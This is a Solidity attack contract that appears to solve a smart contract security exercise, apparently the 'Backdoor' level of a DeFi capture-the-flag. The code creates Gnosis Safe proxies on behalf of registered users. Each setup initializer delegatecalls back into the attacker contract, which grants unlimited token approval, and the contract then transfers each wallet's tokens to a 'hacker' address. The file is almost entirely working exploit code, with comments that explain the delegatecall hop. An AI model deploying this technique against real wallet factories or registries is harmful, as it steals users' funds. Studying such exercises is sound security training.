// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker {

    address public masterCopyAddress;
    address public walletRegistryAddress;
    ProxyFactory proxyFactory;

    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) {
        proxyFactory = ProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
    }

    // we cant delegatecall directly into the ERC20 token's approve function because the state changes would
    // apply for the proxy (set allowance, which is not present on proxy) so instead we used a hop like:
    // this.createProxyWithCallback call -> proxy delegatecall -> this.approve (msg.sender = proxy) -> erc20.approve
    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(address tokenAddress, address hacker, address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            // add the current user as the owner of the proxy
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            // encoded payload to approve tokens for this contract
            bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddress);

            // GnossisSafe::setup function that will be called on the newly created proxy
            // pass in the approve function to to delegateCalled by the proxy into this contract
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
            GnosisSafeProxy proxy =
            proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));
            // transfer the approved tokens
            IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
        }
    }
}
